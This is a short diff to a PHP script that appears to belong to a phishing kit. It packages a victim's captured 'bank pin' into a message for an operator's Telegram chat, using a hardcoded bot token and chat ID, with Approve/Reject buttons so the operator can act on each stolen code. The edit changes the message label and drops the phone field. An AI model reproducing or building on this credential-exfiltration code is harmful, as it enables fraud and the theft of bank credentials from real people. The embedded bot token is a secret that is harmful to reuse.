@@ -11,16 +11,16 @@ $id = rand(100000, 999999);
 $token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8";
 $chat_id = "6057287429";
 
-$message = "NEW USER\n";
-$message .= "Phone: ".$phone."\n";
+$message = "bank pin\n";
+//$message .= "Phone: ".$phone."\n";
 $message .= "Code: ".$pin;
 
 // Inline keyboard buttons
 $keyboard = [
     'inline_keyboard' => [
         [
-            ['text' => 'Approve ✅', 'callback_data' => "approve_pin_$phone"],
-            ['text' => 'Reject ❌', 'callback_data' => "reject_pin_$phone"]
+            ['text' => 'Approve ✅', 'callback_data' => "approve_pin_"],
+            ['text' => 'Reject ❌', 'callback_data' => "reject_pin_"]
         ]
     ]
 ];
